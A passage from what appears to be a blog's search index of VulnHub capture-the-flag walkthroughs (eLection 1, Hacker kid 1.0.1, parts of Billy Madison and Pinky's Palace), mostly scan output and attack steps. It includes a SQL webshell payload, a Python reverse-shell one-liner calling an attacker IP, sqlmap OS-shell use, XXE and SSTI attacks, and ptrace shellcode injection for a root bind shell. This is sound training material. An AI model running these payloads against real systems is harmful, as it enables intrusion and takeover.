veracrypt-1.25.9-setup.tar.bz2 Run setup ./veracrypt-1.25.9-setup-console-x64 Mount BowelMovement ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot] └─# mkdir billy ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot] └─# veracrypt -tc BowelMovement billy Enter password for /root/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/BowelMovement: Enter keyfile [none]: Protect hidden volume (if any)? (y=Yes/n=No) [No]: n View directory structure of billy ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot] └─# tree -a billy/ billy/ ├── $RECYCLE.BIN │   └── desktop.ini └── secret.zip 1 directory, 2 files Unzip secret.zip View extracted files Billy_Madison_12th_Grade_Final_Project.doc THE-END.txt ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/billy] └─# cat THE-END.txt Congratulations! If you&#39;re reading this, you win! I hope you had fun. I had an absolute blast putting this together. I&#39;d love to have your feedback on the box - or at least know you pwned it! Please feel free to shoot me a tweet or email (7ms@7ms.us) and let me know with the subject line: &quot;Stop looking at me swan!&quot; Thanks much, Brian Johnson 7 Minute Security www.7ms.us " }, { "title": "Vulnhub - eLection 1", "url": "/posts/eLection-1/", "categories": "Vulnhub, Linux", "tags": "exploit/sqli/rce, linux-priv-esc/linux-creds-found, pivot, tcp/80-http/web-app-cms-exploit", "date": "2022-02-15 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Mon Feb 14 22:10:40 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/eLection-1/192.168.110.29/scans/_full_tcp_nmap.txt -oX /root/vulnHub/eLection-1/192.168.110.29/scans/xml/_full_tcp_nmap.xml 192.168.110.29Nmap scan report for 192.168.110.29Host is up, received arp-response (0.00073s latency).Scanned at 2022-02-14 22:10:42 +08 for 15sNot shown: 65533 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoqt4FP0lhkJ0tTiMEUrVqRIcNKgQK22LJCOIVa1yoZf+bgOqsR4mIDjgpaJm/SDrAzRhVlD1dL6apkv7T7iceuo5QDXYvRLWS+PfsEaGwGpEVtpTCl/BjDVVtohdzgErXS69pJhgo9a1yNgVrH/W2SUE1b36ODSNqVb690+aP6jjJdyh2wi8GBlNMXBy6V5hR/qmFC55u7F/z5oG1tZxeZpDHbgdM94KRO9dR0WfKDIBQGa026GGcXtN10wtui2UHo65/6WgIG1LxgjppvOQUBMzj1SHuYqnKQLZyQ18E8oxLZTjc6OC898TeYMtyyKW0viUzeaqFxXPDwdI6G91J| 256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO9gF8Fv+Uox9ftsvK/DNkPNObtE4BiuaXjwksbOizwtXBepSbhUTyL5We/fWe7x62XW0CMFJWcuQsBNS7IyjsE=| 256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINfCRDfwNshxW7uRiu76SMZx2hg865qS6TApHhvwKSH580/tcp open http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)MAC Address: 08:00:27:BC:04:D0 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/14%OT=22%CT=1%CU=43441%PV=Y%DS=1%DC=D%G=Y%M=080027%TOS:M=620A62F1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=IOS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%OOS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=OOS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=OS:N%T=40%CD=S)Uptime guess: 21.309 days (since Mon Jan 24 14:46:23 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=259 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.73 ms 192.168.110.29Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Feb 14 22:10:57 2022 -- 1 IP address (1 host up) scanned in 17.93 secondsTCP/80 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/eLection-1]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.29/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376]index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376]javascript [Status: 301, Size: 321, Words: 20, Lines: 10]phpmyadmin [Status: 301, Size: 321, Words: 20, Lines: 10]phpinfo.php [Status: 200, Size: 95531, Words: 4724, Lines: 1170]phpinfo.php [Status: 200, Size: 95531, Words: 4724, Lines: 1170]robots.txt [Status: 200, Size: 30, Words: 1, Lines: 5]robots.txt [Status: 200, Size: 30, Words: 1, Lines: 5]server-status [Status: 403, Size: 279, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 268 req/sec :: Duration: [0:00:04] :: Errors: 0 :: javascript phpmyadmin phpinfo.php robots.txtFFUF - directory-list-2.3-medium.txt┌──(root💀kali)-[~/vulnHub/eLection-1]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.29/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________index.html [Status: 200, Size: 10918, Words: 3499, Lines: 376]javascript [Status: 301, Size: 321, Words: 20, Lines: 10]robots.txt [Status: 200, Size: 30, Words: 1, Lines: 5]election [Status: 301, Size: 319, Words: 20, Lines: 10]phpmyadmin [Status: 301, Size: 321, Words: 20, Lines: 10]phpinfo.php [Status: 200, Size: 95531, Words: 4724, Lines: 1170]server-status [Status: 403, Size: 279, Words: 20, Lines: 10]:: Progress: [882184/882184] :: Job [1/1] :: 9187 req/sec :: Duration: [0:02:18] :: Errors: 0 :: electionInitial FootholdTCP/80 (HTTP) - Weak Credentials + Insert Webshell at phpMyAdmin View enumerated directories javascript 403 Forbidden phpmyadmin robots.txt ┌──(root💀kali)-[~/vulnHub/eLection-1] └─# curl 192.168.110.29/robots.txt admin wordpress user election election No vulnerabilities found Proceed to phpmyadmin, login w/ default credentials (root:toor) Proceed to election -&amp;gt; tb_panitia Crack md5 hash Failed to crack, exhausted rockyou.txt Insert web shell, Select election database -&amp;gt; SQL # Payload SELECT &quot;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&quot; into outfile &quot;/var/www/html/webshell.php&quot; Execute command at webshell.php Obtain www-data shell # Payload python+-c+&#39;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;192.168.110.4&quot;,4444));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/sh&quot;)&#39; Initial Foothold (2) - Directory Enumeration (Log File) Instead of inserting a webshell via phpMyAdmin, directory enumerate election ┌──(root💀kali)-[~/vulnHub/eLection-1] └─# ffuf -u http://192.168.110.29/election/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .html,.txt,.php,.cgi,.log --recursion -of html -o election_fuzz.html -fc 403 system.log View system.log love:P@$$w0rd@123 SSH w/ love:P@$$w0rd@123Initial Foothold (3) - SQLMap OS-SHELL Login to phpMyAdmin w/ root:toor Crack the hash w/ an online tool 1234:Zxc123!@# Proceed to /election/admin &amp;amp; login w/ 1234:Zxc123!@# Search for exploits for election Exploit Title Path eLection 2.0 - ‘id’ SQL Injection php/webapps/48122.txt Try php/webapps/48122.txt Login Proceed to Candidates Intercept w/ burp, edit request according to php/webapps/48122.txt Right-Click -&amp;gt; Save item -&amp;gt; sqli.txt Use SQLMap to insert shell, allowing us to do RCE ┌──(root💀kali)-[~/vulnHub/eLection-1/192.168.110.29/exploit] └─# sqlmap -r sqli.txt --level=5 --risk=3 --os-shell -p id Download php-reverse-shell.php onto target Obtain www-data shell ┌──(root💀kali)-[~/vulnHub/eLection-1] └─# curl http://192.168.110.29/php-reverse-shell.php Privilege EscalationLove - Via Creds Found View files in /var/www/html, look for files that could contain credentials www-data@election:/var/www/html$ find $(pwd) ... /var/www/html/election/admin/logs /var/www/html/election/admin/logs/system.log ... View system.log www-data@election:/var/www/html/election/admin/logs$ cat system.log [2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123 [2020-04-03 00:13:53] Love added candidate &#39;Love&#39;. [2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux). [2022-02-14 21:39:13] Love has been logged in from Unknown IP on Chrome (Linux). www-data@election:/var/www/html/election/admin/logs$ love:P@$$w0rd@123 Switch to love w/ love:P@$$w0rd@123 User Flag love@election:~$ cat /home/love/Desktop/user.txt cd38ac698c0d793a5236d01003f692b0 love@election:~$ Root - Via Serv-U &amp;lt; 15.1.7 Exploit Ran linpeas TCP/43958 Open up the internal service (TCP/43958) w/ chisel Kali ┌──(root💀kali)-[~/vulnHub/eLection-1] └─# chisel server --reverse --port 1337 Target love@election:/tmp$ ./chiselLinux64 client 192.168.110.4:1337 R:8888:127.0.0.1:43958 &amp;amp; Proceed to localhost:8888 Serv-U 15.1.6.25 Search exploits for Serv-U 15.1.6.25 Exploit Title Path Serv-U FTP Server &amp;lt; 15.1.7 - Local Privilege Escalation (1) linux/local/47009.c Serv-U FTP Server &amp;lt; 15.1.7 - Local Privilege Escalation (2) multiple/local/47173.sh Try multiple/local/47173.sh love@election:/tmp$ chmod +x 47173.sh love@election:/tmp$ ./47173.sh Root Flag sh-4.4# cd /root sh-4.4# ls root.txt sh-4.4# cat root.txt 5238feefc4ffe09645d97e9ee49bc3a6 sh-4.4# " }, { "title": "Vulnhub - Hacker kid 1.0.1", "url": "/posts/Hacker-kid-1.0.1/", "categories": "Vulnhub, Linux", "tags": "exploit/xxe-injection, exploit/ssti, linux-priv-esc/capabilities-exploit", "date": "2022-02-14 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sun Feb 13 04:48:02 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Hacker_kid_1.0.1/192.168.110.28/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Hacker_kid_1.0.1/192.168.110.28/scans/xml/_full_tcp_nmap.xml 192.168.110.28Nmap scan report for 192.168.110.28Host is up, received arp-response (0.00045s latency).Scanned at 2022-02-13 04:48:04 +08 for 21sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION53/tcp open domain syn-ack ttl 64 ISC BIND 9.16.1 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.16.1-Ubuntu80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))|_http-title: Notorious Kid : A Hacker | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)9999/tcp open http syn-ack ttl 64 Tornado httpd 6.1| http-title: Please Log In|_Requested resource was /login?next=%2F| http-methods: |_ Supported Methods: GET POST|_http-server-header: TornadoServer/6.1MAC Address: 08:00:27:9A:3F:A1 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.6TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/13%OT=53%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=620OS:81D1A%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=AOS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5BOS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88OS:)ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 16.912 days (since Thu Jan 27 06:55:50 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=256 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.45 ms 192.168.110.28Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Feb 13 04:48:26 2022 -- 1 IP address (1 host up) scanned in 25.79 secondsTCP/80 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Hacker_kid_1.0.1]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.28/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________app.html [Status: 200, Size: 8048, Words: 2070, Lines: 265]cgi-bin/.php [Status: 403, Size: 279, Words: 20, Lines: 10]cgi-bin/ [Status: 403, Size: 279, Words: 20, Lines: 10]cgi-bin/.html [Status: 403, Size: 279, Words: 20, Lines: 10]css [Status: 301, Size: 314, Words: 20, Lines: 10]images [Status: 301, Size: 317, Words: 20, Lines: 10]index.php [Status: 200, Size: 3597, Words: 596, Lines: 113]index.php [Status: 200, Size: 3597, Words: 596, Lines: 113]javascript [Status: 301, Size: 321, Words: 20, Lines: 10]form.html [Status: 200, Size: 10219, Words: 2459, Lines: 248]server-status [Status: 403, Size: 279, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 4939 req/sec :: Duration: [0:00:05] :: Errors: 0 :: app.html index.php images form.html cgi-bin/TCP/9999 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Hacker_kid_1.0.1]└─# ffuf -u http://$ip:9999/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.28:9999/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________ [Status: 302, Size: 0, Words: 1, Lines: 1]login [Status: 200, Size: 452, Words: 21, Lines: 20]logout [Status: 302, Size: 0, Words: 1, Lines: 1]:: Progress: [23075/23075] :: Job [1/1] :: 829 req/sec :: Duration: [0:00:34] :: Errors: 0 :: login logoutNikto- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.110.28+ Target Hostname: 192.168.110.28+ Target Port: 9999+ Start Time: 2022-02-13 04:56:50 (GMT8)---------------------------------------------------------------------------+ Server: TornadoServer/6.1+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Root page / redirects to: /login?next=%2F+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ 7917 requests: 0 error(s) and 3 item(s) reported on remote host+ End Time: 2022-02-13 05:00:35 (GMT8) (225 seconds)---------------------------------------------------------------------------+ 1 host(s) tested TornadoServer/6.1 /login?next=%2FInitial FootholdTCP/9999 (HTTP) - Python Tornado Server Proceed to login login?next=&amp;amp;2F Attempted to exploit login?next=&amp;amp;2F LFI Command Injection Attempt SQLi All Failed Managed to trigger an error What is TornadoServer Tornado is a Python web framework and asynchronous networking library, originally developed at FriendFeed. Find exploits for TornadoServer/6.1 Exploit URL SSTI (Server Side Template Injection) https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/ SSTI (Server Side Template Injection) https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python Attempt SSTI Did not work, we might have to obtain a valid credential and login before we can exploit this vulnerability TCP/80 (HTTP) - Fuzz GET Parameter Directory enumerate cgi-bin/FUZZ Did not find any .cgi files View enumerated directories app.html Could not find any vulnerabilities index.php GET parameter: ?page_no form.html Could not find any vulnerabilities Enumerate page_no GET parameter Setup Results Add hackers.blackhat.local to /etc/hosts echo &quot;192.168.110.28 hackers.blackhat.local&quot; &amp;gt;&amp;gt; /etc/hosts TCP/80 (HTTP) - DNS Enumeration Enumerate subdomains w/ dig, dig command in Linux is used to gather DNS information ┌──(root💀kali)-[~/vulnHub/Hacker_kid_1.0.1] └─# dig hackers.blackhat.local @$ip ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.0-2-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; hackers.blackhat.local @192.168.110.28 ;; global options: +cmd ;; Got answer: ;; WARNING: .local is reserved for Multicast DNS ;; You are currently testing what happens when an mDNS query is leaked to DNS ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NXDOMAIN, id: 34032 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: c00738aff09f1cee0100000062089d0bf24fa6beb3cfd099 (good) ;; QUESTION SECTION: ;hackers.blackhat.local. IN A ;; AUTHORITY SECTION: blackhat.local. 3600 IN SOA blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600 ;; Query time: 0 msec ;; SERVER: 192.168.110.28#53(192.168.110.28) (UDP) ;; WHEN: Sun Feb 13 05:54:20 +08 2022 ;; MSG SIZE rcvd: 125 hackerkid.blackhat.local Add hackerkid.blackhat.local to /etc/hosts ┌──(root💀kali)-[~/vulnHub/Hacker_kid_1.0.1] └─# echo &quot;192.168.110.28 hackerkid.blackhat.local&quot; &amp;gt;&amp;gt; /etc/hosts Proceed to hackerkid.blackhat.local TCP/80 (HTTP) - XXE Injection Submit a form, intercept it w/ burp The request is in XML format. The email field is reflected back, we can try XXE injection in the email field. Payload Attempt to do XXE Injection in the email field Obtain users in /etc/passwd ┌──(root💀kali)-[~/vulnHub/Hacker_kid_1.0.1/192.168.110.28/exploit] └─# cat passwd | awk -F: &#39;($3&amp;gt;=1000)&amp;amp;&amp;amp;($1!=&quot;nobody&quot;){print $1}&#39; saket saket Include files in saket’s home directory .bashrc, .bash_history failed Instead, use PHP Wrapper to view the files .bash_history .bashrc Decoded ┌──(root💀kali)-[~/vulnHub/Hacker_kid_1.0.1/192.168.110.28/exploit] └─# base64 -d encoded_bashrc.txt SNIP #Setting Password for running python app username=&quot;admin&quot; password=&quot;Saket!#$%@!!&quot; admin:Saket!#$%@!! TCP/9999 (HTTP) - SSTI Login w/ admin:Saket!#$%@!!, failed Login w/ saket:Saket!#$%@!! Fuzz for vulnerabilities ┌──(root💀kali)-[~/vulnHub/Hacker_kid_1.0.1/192.168.110.28/exploit] └─# ffuf -u http://192.168.110.28:9999/?W1=W2 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:W1 -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W2 -H &#39;Cookie: _xsrf=2|e138688c|df38105665c8988ec4ff6530f419a2fb|1644728769; user=&quot;2|1:0|10:1644767656|4:user|8:c2FrZXQ=|953dbb527b615cab4e0506589c0196f949dda3f2a5da54595de6f7e06f634569&quot;; incorrect=&quot;2|1:0|10:1644767656|9:incorrect|4:MA==|5bd1a9396865cb7a0745567ff013abea8fdc3182995d897fb284520b39005898&quot;&#39; -fw 21 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.28:9999/?W1=W2 :: Wordlist : W1: /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt :: Wordlist : W2: /usr/share/wordlists/LFI/file_inclusion_linux.txt :: Header : Cookie: _xsrf=2|e138688c|df38105665c8988ec4ff6530f419a2fb|1644728769; user=&quot;2|1:0|10:1644767656|4:user|8:c2FrZXQ=|953dbb527b615cab4e0506589c0196f949dda3f2a5da54595de6f7e06f634569&quot;; incorrect=&quot;2|1:0|10:1644767656|9:incorrect|4:MA==|5bd1a9396865cb7a0745567ff013abea8fdc3182995d897fb284520b39005898&quot; :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 21 ________________________________________________ [Status: 200, Size: 274, Words: 10, Lines: 19] * W1: name * W2: %00../../../../../../etc/passwd [Status: 200, Size: 274, Words: 10, Lines: 19] * W2: %00../../../../../../etc/shadow * W1: name [Status: 200, Size: 240, Words: 10, Lines: 19] * W1: name * W2: %00/etc/passwd%00 ?name=&amp;lt;SSTI Payload&amp;gt; Exploits we found earlier Exploit URL SSTI (Server Side Template Injection) https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/ SSTI (Server Side Template Injection) https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python Attempt SSTI URL Encode reverse shell payload Obtain shell Privilege EscalationRoot - Via Linux Capabilities (SYS_PTRACE) Linpeas cap_sys_ptrace+ep is set on python2.7, this can be used for privilege escalation. sys_ptrace exploit demo Exploiting sys_ptrace Find a process running as root saket@ubuntu:/tmp$ ps aux | grep root ... root 766 0.0 0.4 199780 4728 ? Ss 20:15 0:00 /usr/sbin/apache2 -k start ... PID 766 Download a bindshell shellcode payload This will start a bind shell at TCP/5600 Downloadinject.py exploit Add bindshell shellcode at Line 70 Run inject.py specifying PID 766 saket@ubuntu:/tmp$ /usr/bin/python2.7 inject.py 766Instruction Pointer: 0x7f1554d1d0daLInjecting Shellcode at: 0x7f1554d1d0daLShellcode Injected!!Final Instruction Pointer: 0x7f1554d1d0dcL Obtain root shell ┌──(root💀kali)-[~/vulnHub/Hacker_kid_1.0.1/192.168.110.28/exploit] └─# nc 192.168.110.28 5600 id uid=0(root) gid=0(root) groups=0(root) Alternative saket@ubuntu:/tmp$ for x in {1..1000}; do /usr/bin/python2.7 inject.py $x; done " }, { "title": "Vulnhub - Pinky&#39;s Palace v1", "url": "/posts/Pinky's-Palace-v1/", "categories": "Vulnhub, Linux", "tags": "pivot, exploit/sqli/database-enum, linux-priv-esc/linux-creds-found, bof/linux-bof", "date": "2022-02-12 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Sat Feb 12 01:47:10 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/PinkysPalaceV1/192.168.110.27/scans/_full_tcp_nmap.txt -oX /root/vulnHub/PinkysPalaceV1/192.168.110.27/scans/xml/_full_tcp_nmap.xml 192.168.110.27Nmap scan report for 192.168.110.27Host is up, received arp-response (0.00036s latency).Scanned at 2022-02-12 01:47:11 +08 for 33sNot shown: 65532 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION8080/tcp open http syn-ack ttl 64 nginx 1.10.3|_http-title: 403 Forbidden|_http-server-header: nginx/1.10.331337/tcp open http-proxy syn-ack ttl 64 Squid http proxy 3.5.23|_http-title: ERROR: The requested URL could not be retrieved|_http-server-header: squid/3.5.2364666/tcp open ssh syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)| ssh-hostkey: | 2048 df:02:12:4f:4c:6d:50:27:6a:84:e9:0e:5b:65:bf:a0 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/eH9dt7PVqsTKvqz7gb2G/6/0wUl+dy6gSLPDX0bqkIwc5k0IiCefKqk9MpBbTOU6aUWE3T/y9IYCAjhCaW7QTRrrVn+rUviz+8lABk50s29Z5hBEDwMOme+OZ5rTX3z+8096MgbOdgPMEsQbk3W/eWTDNHXUrU9iijz0zcZgC/HkuS+1E/C8IC3+CR30GQTA+cLXD8CKQ38WEukuNbvAlwEtjw3kMGvv74kzek8cVsWQGPB1y2qLv+miQHaWROiP//WzM5e69gXiFRNcC8spesAzRH0pkYXXTDTGpgG3sBu4G+lGBHncU+30a7i2AEtv+tAy0C2bvFYHqymdFJFv| 256 0a:ad:aa:c7:16:f7:15:07:f0:a8:50:23:17:f3:1c:2e (ECDSA)| ecdsa-sha2-nistp256 